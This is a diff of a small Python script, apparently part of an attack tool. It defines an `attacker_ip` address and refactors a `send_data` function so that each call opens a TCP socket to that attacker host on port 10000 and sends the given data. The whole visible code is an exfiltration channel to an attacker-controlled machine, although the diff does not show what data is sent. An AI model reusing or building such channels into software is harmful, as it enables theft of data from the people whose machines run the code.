@@ -2,9 +2,6 @@ import socket
 import time
 
 attacker_ip = "192.168.0.110"
-
-# Create a TCP/IP socket
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_address = (attacker_ip, 10000)
 
 
@@ -30,7 +27,11 @@ server_address = (attacker_ip, 10000)
 # finally:
 #     print('closing socket')
 #     sock.close()
+
+
 def send_data(data):
+    # Create a TCP/IP socket
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect(server_address)
     sock.sendall(data)
     # received = sock.recv(32)
